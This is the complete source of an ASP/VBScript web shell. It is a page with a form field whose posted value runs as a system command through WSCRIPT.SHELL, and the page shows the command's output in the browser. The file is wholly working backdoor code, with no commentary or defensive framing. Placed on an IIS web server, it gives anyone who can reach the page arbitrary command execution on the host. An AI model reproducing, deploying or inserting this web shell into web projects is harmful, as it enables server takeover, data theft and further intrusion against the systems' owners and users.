 
 <%@ Language=VBScript %>
 <%

   Dim oScript
   Dim oScriptNet
   Dim oFileSys, oFile
   Dim szCMD, szTempFile
 
   On Error Resume Next
 
   ' -- create the COM objects that we will be using -- '
   Set oScript = Server.CreateObject("WSCRIPT.SHELL")
   Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
   Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
 
   ' -- check for a command that we have posted -- '
   szCMD = Request.Form(".CMD")
   If (szCMD <> "") Then
 
     ' -- Use a poor man's pipe ... a temp file -- '
     szTempFile = "C:\" & oFileSys.GetTempName( )
     Call oScript.Run ("command /c " & szCMD & " > " & szTempFile, 0, True)
     Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
 
   End If
 
 %>
 <HTML>
 <BODY>
 <FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
 <input type=text name=".CMD" size=45 value="<%= szCMD %>">
 <input type=submit value="Run">
 </FORM>
 <PRE>

 <%
   If (IsObject(oFile)) Then
     ' -- Read the output from our command and remove the temp file -- '
     On Error Resume Next
     Response.Write Server.HTMLEncode(oFile.ReadAll)
     oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</BODY>
</HTML>
